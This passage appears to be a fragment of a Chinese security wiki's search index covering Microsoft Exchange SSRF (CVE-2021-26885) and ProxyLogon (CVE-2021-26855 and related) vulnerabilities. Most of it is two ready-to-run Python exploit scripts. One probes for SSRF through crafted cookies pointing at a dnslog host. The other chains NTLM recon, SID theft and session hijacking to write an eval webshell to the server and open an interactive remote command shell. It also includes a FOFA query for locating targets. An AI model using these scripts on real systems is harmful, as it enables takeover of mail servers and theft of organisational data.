image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: image Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: X-AnonResource=true; X-AnonResource-Backend=ianqsx.dnslog.cn/ecp/default.flt?~3; X-BEResource=ianqsx.dnslog.cn/owa/auth/logon.aspx?~3; [!NOTE] Cookie: X-AnonResource=true; X-AnonResource-Backend=ianqsx.dnslog.cn/ecp/default.flt?~3; X-BEResource=ianqsx.dnslog.cn/owa/auth/logon.aspx?~3; \u5c06\u5176\u4e2d\u7684 Dnslog\u6362\u6210\u81ea\u5df1\u7684 \u786e\u5b9a\u6536\u5230\u4e86\u7531\u670d\u52a1\u7aef\u53d1\u9001\u7684\u8bf7\u6c42\uff0c\u5b58\u5728SSRF\u6f0f\u6d1e","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Microsoft%20Exchange/Microsoft%20Exchange%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-26885/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import random import re import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Microsoft Exchange\u591a\u4e2a\u7248\u672c \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> mail.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mDnslog >>> xxxx.dnslog.cn \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = \"https://\" + target_url + \"/ecp/PeiQi.js\" headers = { 'Cookie' : 'X-BEResource=peiqi_wiki/api/endpoint#~1; X-AnonResource=true' } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if response . status_code == 500 and 'NegotiateSecurityContext' in response . text and 'peiqi_wiki' in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728SSRF\u6f0f\u6d1e\uff0c \u8f93\u5165Dnslog\u5730\u5740\u8fdb\u4e00\u6b65\u68c0\u6d4b.... \\033 [0m\" . format ( target_url )) dnslog = str ( input ( \" \\033 [35mDnslog >>> \\033 [0m\" )) POC_2 ( target_url , dnslog ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728SSRF\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , dnslog ): vuln_url = \"https://\" + target_url + \"/owa/auth/PeiQi.js\" headers = { 'Cookie' : 'X-AnonResource=true; X-AnonResource-Backend= {} /ecp/default.flt?~3; X-BEResource= {} /owa/auth/logon.aspx?~3;' . format ( dnslog , dnslog ) } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u8bf7\u67e5\u770b Dnslog\uff1a {} \u54cd\u5e94.... \\033 [0m\" . format ( dnslog )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Microsoft%20Exchange/Microsoft%20Exchange%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-26885/#goby--poc","text":"[!NOTE] Microsoft Exchange SSRF\u6f0f\u6d1e CVE-2021-26885","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Microsoft%20Exchange/Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2021-27065%2026857%2026858%2027065/","text":"Microsoft Exchange \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c CVE-2021-26855/26857/26858/27065 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Microsoft Exchange Server \u662f\u4e2a\u6d88\u606f\u4e0e\u534f\u4f5c\u7cfb\u7edf\u3002Exchange Server\u53ef\u4ee5\u88ab\u7528\u6765\u6784\u67b6\u5e94\u7528\u4e8e\u4f01\u4e1a\u3001\u5b66\u6821\u7684\u90ae\u4ef6\u7cfb\u7edf\u6216\u514d\u8d39\u90ae\u4ef6\u7cfb\u7edf\u30022021\u5e7403\u670803\u65e5\u5fae\u8f6f\u5b98\u65b9\u62ab\u9732\u591a\u4e2aExchange\u9ad8\u5371\u6f0f\u6d1e\uff1a CVE-2021-26855 Exchange\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e\u3002\u5229\u7528\u6b64\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\u80fd\u591f\u4ee5Exchange Server\u53d1\u9001HTTP\u8bf7\u6c42\uff0c\u626b\u63cf\u5185\u7f51\uff0c\u83b7\u53d6Exchange\u7528\u6237\u4fe1\u606f\u3002 CVE-2021-26857 Exchange\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u5728\u670d\u52a1\u5668\u4e0a\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002 CVE-2021-26858/CVE-2021-27065 Exchange\u4e2d\u8eab\u4efd\u9a8c\u8bc1\u540e\u7684\u4efb\u610f\u6587\u4ef6\u5199\u5165\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7CVE-2021-26855\u7684ssrf\u6f0f\u6d1e\u83b7\u53d6\u5230\u7684Exchange administrator\u51ed\u8bc1\uff0c\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u5728\u7cfb\u7edf\u4e0a\u5199\u5165\u4efb\u610f\u6587\u4ef6\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Exchange 2013 Versions < 15.00.1497.012, Exchange 2016 CU18 < 15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009, Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010 FOFA \u00b6 [!NOTE] icon_hash=\"1768726119\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 4\u7bc7\u5173\u4e8e\u539f\u7406\u7684\u53c2\u8003\u6587\u7ae0 https://www.praetorian.com/blog/reproducing-proxylogon-exploit/ https://www.crowdstrike.com/blog/falcon-complete-stops-microsoft-exchange-server-zero-day-exploits/ https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/ https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/ [!NOTE] \u5176\u4e2d\u4e00\u6b21\u653b\u51fb\u4e2d\u7684\u65e5\u5fd7 \u53ef\u4ee5\u770b\u5230\u9996\u5148\u8bf7\u6c42\u4e86 /rpc/ \u8fd9\u4e2a\u76ee\u5f55 \u6839\u636e\u7f51\u4e0a\u516c\u5e03\u7684 POC\u4e0eEXP\uff0c\u53ef\u4ee5\u770b\u5230 NTML\u534f\u5546\u6d88\u606f\u4f1a\u8fd4\u56de\u6211\u4eecNTML\u8be2\u95ee\u4fe1\u606f\uff0c \u5176\u4e2d\u5305\u542b\u4e86 AV_PAIR\u7ed3\u6784\uff0c\u5176\u4e2d\u5305\u542b\u4e86 \u540e\u7aef\u670d\u52a1\u5668\u540d\u79f0\u4e0e\u57df\u540d base64\u89e3\u5bc6\u5176\u4e2d\u7684\u52a0\u5bc6\u90e8\u5206 \u5728\u901a\u8fc7\u89e3\u5305\u7684\u65b9\u6cd5\u8f6c\u6362\u5176\u4e2d\u7684\u6570\u636e\u5c31\u53ef\u4ee5\u5f97\u5230\u5b8c\u6574\u7684\u540e\u7aef\u670d\u52a1\u5668\u540d\u79f0\u4e0e\u57df\u540d \u540e\u9762\u7684\u5927\u5bb6\u5c31\u53c2\u8003\u6587\u7ae0\u548cEXP\u6765\u7814\u7a76\u539f\u7406\u5427\uff0c\u51e0\u7bc7\u6587\u7ae0\u548cEXP\u5df2\u7ecf\u5f88\u5b8c\u6574\u4e86 \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] EXP\u6839\u636e\u63a8\u7279\u548cGithub\u51e0\u4e2a\u811a\u672c\u66f4\u6539 \u9ed8\u8ba4\u6253\u7684\u90ae\u7bb1\u4e3a administrator@xxx.xxx.cn (\u53ef\u4ee5\u81ea\u884c\u66f4\u6539) webshell\u8def\u5f84\u548c\u811a\u672c\u6587\u4ef6\u4e2d\u66f4\u6539 \u8fd0\u884c\u7684\u547d\u4ee4\u662f ping Dnslog\u8bc1\u660e\u6f0f\u6d1e\u5b58\u5728(\u4e00\u4e9b\u4e1c\u897f\u5c31\u5927\u5bb6\u81ea\u5df1\u770b\u770b\u811a\u672c\u6539\u5427~) #!/usr/bin/python2 # coding: UTF-8 import re import sys import json import string import requests from urllib import urlencode from tld import get_fld from struct import unpack from base64 import b64encode , b64decode from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Microsoft Exchang \u591a\u4e2a\u7248\u672c \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> mail.xxx.org \\033 [0m' ) print ( '+ \\033 [36mEmail >>> Administrator@\u6839\u57df\u540d (\u9ed8\u8ba4) \\033 [0m' ) print ( '+------------------------------------------' ) def _unpack_str ( byte_string ): return byte_string . decode ( 'UTF-8' ) . replace ( ' \\x00 ' , '' ) def _unpack_int ( format , data ): return unpack ( format , data )[ 0 ] def parse_challenge ( Negotiate_base64_decode ): target_info_field = Negotiate_base64_decode [ 40 : 48 ] target_info_len = _unpack_int ( 'H' , target_info_field [ 0 : 2 ]) target_info_offset = _unpack_int ( 'I' , target_info_field [ 4 : 8 ]) target_info_bytes = Negotiate_base64_decode [ target_info_offset : target_info_offset + target_info_len ] domain_name = '' computer_name = '' info_offset = 0 while info_offset < len ( target_info_bytes ): av_id = _unpack_int ( 'H' , target_info_bytes [ info_offset : info_offset + 2 ]) av_len = _unpack_int ( 'H' , target_info_bytes [ info_offset + 2 : info_offset + 4 ]) av_value = target_info_bytes [ info_offset + 4 : info_offset + 4 + av_len ] info_offset = info_offset + 4 + av_len if av_id == 2 : # MsvAvDnsDomainName domain_name = _unpack_str ( av_value ) elif av_id == 3 : # MsvAvDnsComputerName computer_name = _unpack_str ( av_value ) if domain_name and computer_name : return domain_name , computer_name else : print ( \" \\033 [31m[x] \u8ba1\u7b97\u673a\u540d\u79f0\u6216\u57df\u540d\u79f0\u83b7\u53d6\u5931\u8d25\" ) sys . exit ( 0 ) def POC_1 ( target_url , Email ): print ( \" \\033 [32m[o] \u6b63\u5728\u83b7\u53d6 \u8ba1\u7b97\u673a\u540d\u79f0\u548c\u57df\u540d\u79f0..... \\033 [0m\" ) ntlm_type1 = ( 'NTLMSSP \\x00 ' # NTLMSSp\u7b7e\u540d ' \\x01\\x00\\x00\\x00 ' # \u4fe1\u606f\u7c7b\u578b ' \\x97\\x82\\x08\\xe2 ' # \u6807\u8bb0 ' \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ' # \u57df\u540d\u79f0\u5b57\u7b26 ' \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ' # \u5de5\u4f5c\u5b57\u7b26 ' \\x0a\\x00\\xba\\x47\\x00\\x00\\x00\\x0f ' # \u7cfb\u7edf\u7248\u672c ) headers = { 'Authorization' : 'Negotiate {} ' . format ( b64encode ( ntlm_type1 )) } basic_url = 'https:// {} /rpc/' . format ( target_url ) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = basic_url , headers = headers , verify = False ) if response . status_code == 401 : Negotiate_base64_encode = response . headers [ 'WWW-Authenticate' ] Negotiate_base64_decode = re . search ( 'Negotiate ([A-Za-z0-9/+=]+)' , Negotiate_base64_encode ) . group ( 1 ) domain_name , computer_name = parse_challenge ( b64decode ( Negotiate_base64_decode )) print ( \" \\033 [32m[o] \u8ba1\u7b97\u673a\u540d\u79f0: {} \\033 [0m\" . format ( computer_name )) print ( \" \\033 [32m[o] \u57df\u540d\u79f0: {} \\033 [0m\" . format ( domain_name )) POC_2 ( target_url , Email , computer_name ) else : print ( \" \\033 [31m[x] \u83b7\u53d6\u5931\u8d25\" ) sys . exit ( 0 ) def POC_2 ( target_url , Email , computer_name ): payload = ''' <Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\"> <Request> <EMailAddress> %s </EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema> </Request> </Autodiscover> ''' % Email vuln_url = '/autodiscover/autodiscover.xml' headers = { 'User-Agent' : 'ExchangeServicesClient/0.0.0.0' , 'Content-Type' : 'text/xml' , 'Cookie' : 'X-BEResource=a]@ {} :444 {} ?#~1941962753' . format ( computer_name , vuln_url ), 'msExchLogonMailbox' : 'S-1-5-20' } url = \"https:// {} /ecp/PeiQi.js\" . format ( target_url ) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url , headers = headers , data = payload , verify = False , allow_redirects = False ) LegacyDN = re . findall ( r '<LegacyDN>(.*?)</LegacyDN>' , response . text )[ 0 ] print ( \" \\033 [32m[o] LegacyDN: {} \\033 [0m\" . format ( LegacyDN )) vuln_url = '/mapi/emsmdb/' headers = { 'X-Clientapplication' : 'Outlook/15.0.4815.1002' , 'X-Requestid' : 'x' , 'X-Requesttype' : 'Connect' , 'Cookie' : 'X-BEResource=a]@ {} :444 {} ?#~1941962753' . format ( computer_name , vuln_url ), 'Content-Type' : 'application/mapi-http' , 'msExchLogonMailbox' : 'S-1-5-20' , } payload = LegacyDN + ' \\x00\\x00\\x00\\x00\\x00\\x20\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x00\\x00\\x00\\x00 ' url = \"https:// {} /ecp/PeiQi.js\" . format ( target_url ) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url , headers = headers , data = payload , verify = False , allow_redirects = False ) SID = re . search ( 'with SID ([S\\-0-9]+) ' , response . content ) . group ( 1 ) print ( \" \\033 [32m[o] SID: {} \\033 [0m\" . format ( SID )) vuln_url = '/ecp/proxyLogon.ecp' payload = '<r at=\"NTLM\" ln=\" %s \"><s t=\"0\"> %s </s></r>' % ( Email . split ( '@' )[ 0 ], SID ) headers = { 'X-Clientapplication' : 'Outlook/15.0.4815.1002' , 'X-Requestid' : 'x' , 'X-Requesttype' : 'Connect' , 'Cookie' : 'X-BEResource=a]@ {} :444 {} ?#~1941962753' . format ( computer_name , vuln_url ), 'Content-Type' : 'application/json' , 'msExchLogonMailbox' : 'S-1-5-20' , } url = \"https:// {} /ecp/PeiQi.js\" . format ( target_url ) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url , headers = headers , data = payload , verify = False , allow_redirects = False ) session_id = response . cookies . get ( 'ASP.NET_SessionId' ) canary = response . cookies . get ( 'msExchEcpCanary' ) print ( \" \\033 [32m[o] Session_id: {} \\033 [0m\" . format ( session_id )) print ( \" \\033 [32m[o] Canary : {} \\033 [0m\" . format ( canary )) extra_cookies = [ 'ASP.NET_SessionId=' + session_id , 'msExchEcpCanary=' + canary ] vuln_url = '/ecp/DDI/DDIService.svc/GetObject' qs = urlencode ({ 'schema' : 'OABVirtualDirectory' , 'msExchEcpCanary' : canary }) headers = { 'X-Clientapplication' : 'Outlook/15.0.4815.1002' , 'X-Requestid' : 'x' , 'X-Requesttype' : 'Connect' , 'Cookie' : 'X-BEResource=a]@ {} :444 {} ? {} #~1941962753;ASP.NET_SessionId= {} ;msExchEcpCanary= {} ' . format ( computer_name , vuln_url , qs , session_id , canary ), 'Content-Type' : 'application/json' , 'msExchLogonMailbox' : 'S-1-5-20' , } url = \"https:// {} /ecp/PeiQi.js\" . format ( target_url ) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url , headers = headers , data = '' , verify = False , allow_redirects = False ) identity = response . json ()[ 'd' ][ 'Output' ][ 0 ][ 'Identity' ] print ( \" \\033 [32m[o] OAB Name: {} \\033 [0m\" . format ( identity [ 'DisplayName' ])) print ( \" \\033 [32m[o] OAB ID: {} \\033 [0m\" . format ( identity [ 'RawIdentity' ])) FILE_PATH = 'C: \\\\ inetpub \\\\ wwwroot \\\\ aspnet_client \\\\ PeiQi.aspx' FILE_DATA = '<script language=\"JScript\" runat=\"server\">function Page_Load(){eval(Request[\"PeiQi\"],\"unsafe\");}</script>' vuln_url = '/ecp/DDI/DDIService.svc/SetObject' qs = urlencode ({ 'schema' : 'OABVirtualDirectory' , 'msExchEcpCanary' : canary }) payload = json . dumps ({ 'identity' : { '__type' : 'Identity:ECP' , 'DisplayName' : identity [ 'DisplayName' ], 'RawIdentity' : identity [ 'RawIdentity' ] }, 'properties' : { 'Parameters' : { '__type' : 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel' , 'ExternalUrl' : 'http://f/' + FILE_DATA } } }) headers = { 'X-Clientapplication' : 'Outlook/15.0.4815.1002' , 'X-Requestid' : 'x' , 'X-Requesttype' : 'Connect' , 'Cookie' : 'X-BEResource=a]@ {} :444 {} ? {} #~1941962753;ASP.NET_SessionId= {} ;msExchEcpCanary= {} ' . format ( computer_name , vuln_url , qs , session_id , canary ), 'Content-Type' : 'application/json' , 'msExchLogonMailbox' : 'S-1-5-20' , } url = \"https:// {} /ecp/PeiQi.js\" . format ( target_url ) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url , headers = headers , data = payload , verify = False , allow_redirects = False ) if response . status_code == 200 : print ( \" \\033 [32m[o] \u901a\u8fc7OAB\u8bbe\u7f6eWebshell\u6210\u529f \\033 [0m\" ) vuln_url = \"/ecp/DDI/DDIService.svc/SetObject\" qs = urlencode ({ 'schema' : 'ResetOABVirtualDirectory' , 'msExchEcpCanary' : canary }) payload = json . dumps ({ 'identity' : { '__type' : 'Identity:ECP' , 'DisplayName' : identity [ 'DisplayName' ], 'RawIdentity' : identity [ 'RawIdentity' ] }, 'properties' : { 'Parameters' : { '__type' : 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel' , 'FilePathName' : FILE_PATH } } }) headers = { 'X-Clientapplication' : 'Outlook/15.0.4815.1002' , 'X-Requestid' : 'x' , 'X-Requesttype' : 'Connect' , 'Cookie' : 'X-BEResource=a]@ {} :444 {} ? {} #~1941962753;ASP.NET_SessionId= {} ;msExchEcpCanary= {} ' . format ( computer_name , vuln_url , qs , session_id , canary ), 'Content-Type' : 'application/json' , 'msExchLogonMailbox' : 'S-1-5-20' , } url = \"https:// {} /ecp/PeiQi.js\" . format ( target_url ) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url , headers = headers , data = payload , verify = False , allow_redirects = False ) if response . status_code == 200 : print ( \" \\033 [32m[o] \u6b63\u5728\u5c1d\u8bd5\u5199\u5165Webshell \\033 [0m\" ) vuln_url = \"/ecp/DDI/DDIService.svc/SetObject\" qs = urlencode ({ 'schema' : 'OABVirtualDirectory' , 'msExchEcpCanary' : canary }) payload = json . dumps ({ 'identity' : { '__type' : 'Identity:ECP' , 'DisplayName' : identity [ 'DisplayName' ], 'RawIdentity' : identity [ 'RawIdentity' ] }, 'properties' : { 'Parameters' : { '__type' : 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel' , 'ExternalUrl' : '' } } }) headers = { 'X-Clientapplication' : 'Outlook/15.0.4815.1002' , 'X-Requestid' : 'x' , 'X-Requesttype' : 'Connect' , 'Cookie' : 'X-BEResource=a]@ {} :444 {} ? {} #~1941962753;ASP.NET_SessionId= {} ;msExchEcpCanary= {} ' . format ( computer_name , vuln_url , qs , session_id , canary ), 'Content-Type' : 'application/json' , 'msExchLogonMailbox' : 'S-1-5-20' , } url = \"https:// {} /ecp/PeiQi.js\" . format ( target_url ) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url , headers = headers , data = payload , verify = False , allow_redirects = False ) print ( \" \\033 [32m[o] \u6e05\u9664 OAB \\033 [0m\" ) print ( \" \\033 [32m[o] \u6b63\u5728\u9a8c\u8bc1 Webshell\u662f\u5426\u4e0a\u4f20\u6210\u529f.......... \\033 [0m\" ) webshell_url = \"https://\" + target_url + \"/aspnet_client/PeiQi.aspx\" requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = webshell_url , verify = False , allow_redirects = False ) if response . status_code == 200 and \"Name\" in response . text : print ( \" \\033 [32m[o] \u4e0a\u4f20 Webshll\u6210\u529f, \u5730\u5740\u4e3a: {} \\033 [0m\" . format ( \"https://\" + target_url + \"/aspnet_client/PeiQi.aspx\" )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) while True : Cmd = str ( raw_input ( \" \\033 [35mCmd >>> \\033 [0m\" )) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) Cmd_url = \"https://\" + target_url + '/aspnet_client/PeiQi.aspx?PeiQi=Response.Write(new%20ActiveXObject(\"WScript.Shell\").exec(\"cmd /c {} \").StdOut.ReadAll());' . format ( Cmd ) response = requests . get ( url = Cmd_url , verify = False , allow_redirects = False ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) if __name__ == '__main__' : reload ( sys ) sys . setdefaultencoding ( 'utf8' ) title () target_url = str ( raw_input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) Email = \"Administrator@ {} \" . format ( get_fld ( \"https://\" + target_url )) print ( \" \\033 [32m[o] \u8bf7\u6c42\u5730\u5740: {} \uff0c\u4f7f\u7528\u7684\u90ae\u7bb1: {} \\033 [0m\" . format ( target_url , Email )) POC_1 ( target_url , Email )","title":"Microsoft Exchange \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c CVE-2021-27065 26857 26858 27065"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Microsoft%20Exchange/Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2021-27065%2026857%2026858%2027065/#microsoft-exchange-\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c-cve-2021-26855268572685827065","text":"","title":"Microsoft Exchange \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c CVE-2021-26855/26857/26858/27065"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Microsoft%20Exchange/Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2021-27065%2026857%2026858%2027065/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Microsoft Exchange Server \u662f\u4e2a\u6d88\u606f\u4e0e\u534f\u4f5c\u7cfb\u7edf\u3002Exchange Server\u53ef\u4ee5\u88ab\u7528\u6765\u6784\u67b6\u5e94\u7528\u4e8e\u4f01\u4e1a\u3001\u5b66\u6821\u7684\u90ae\u4ef6\u7cfb\u7edf\u6216\u514d\u8d39\u90ae\u4ef6\u7cfb\u7edf\u30022021\u5e7403\u670803\u65e5\u5fae\u8f6f\u5b98\u65b9\u62ab\u9732\u591a\u4e2aExchange\u9ad8\u5371\u6f0f\u6d1e\uff1a CVE-2021-26855 Exchange\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e\u3002\u5229\u7528\u6b64\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\u80fd\u591f\u4ee5Exchange Server\u53d1\u9001HTTP\u8bf7\u6c42\uff0c\u626b\u63cf\u5185\u7f51\uff0c\u83b7\u53d6Exchange\u7528\u6237\u4fe1\u606f\u3002 CVE-2021-26857 Exchange\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u5728\u670d\u52a1\u5668\u4e0a\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002 CVE-2021-26858/CVE-2021-27065 Exchange\u4e2d\u8eab\u4efd\u9a8c\u8bc1\u540e\u7684\u4efb\u610f\u6587\u4ef6\u5199\u5165\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7CVE-2021-26855\u7684ssrf\u6f0f\u6d1e\u83b7\u53d6\u5230\u7684Exchange administrator\u51ed\u8bc1\uff0c\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u5728\u7cfb\u7edf\u4e0a\u5199\u5165\u4efb\u610f\u6587\u4ef6\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Microsoft%20Exchange/Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2021-27065%2026857%2026858%2027065/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Exchange 2013 Versions < 15.00.1497.012, Exchange 2016 CU18 < 15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009, Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Microsoft%20Exchange/Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2021-27065%2026857%2026858%2027065/#fofa","text":"[!NOTE] icon_hash=\"1768726119\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Microsoft%20Exchange/Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2021-27065%2026857%2026858%2027065/#\u6f0f\u6d1e\u590d\u73b0","text":"4\u7bc7\u5173\u4e8e\u539f\u7406\u7684\u53c2\u8003\u6587\u7ae0 https://www.praetorian.com/blog/reproducing-proxylogon-exploit/ https://www.crowdstrike.com/blog/falcon-complete-stops-microsoft-exchange-server-zero-day-exploits/ https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/ https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/ [!NOTE] \u5176\u4e2d\u4e00\u6b21\u653b\u51fb\u4e2d\u7684\u65e5\u5fd7 \u53ef\u4ee5\u770b\u5230\u9996\u5148\u8bf7\u6c42\u4e86 /rpc/ \u8fd9\u4e2a\u76ee\u5f55 \u6839\u636e\u7f51\u4e0a\u516c\u5e03\u7684 POC\u4e0eEXP\uff0c\u53ef\u4ee5\u770b\u5230 